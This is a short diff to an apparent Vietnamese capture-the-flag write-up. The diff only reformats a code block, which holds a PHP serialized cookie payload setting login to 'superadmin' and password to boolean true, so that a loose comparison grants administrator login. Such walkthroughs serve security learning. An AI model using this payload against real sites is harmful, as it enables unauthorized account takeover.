@@ -46,7 +46,9 @@ if($_SESSION['login'] === "superadmin"){
 ![image](https://github.com/user-attachments/assets/59af0b98-bd2b-4984-afec-cde2c6e2c9de)
 
 cookie autologin có thể thay đổi nên ta sử dụng payload 
-```autologin=a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}```
+```
+autologin=a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
+```
 
 nhá nhẹ b:1 = TRUE =))) còn lại thì ae tự tìm hiểu thêm nhé
 
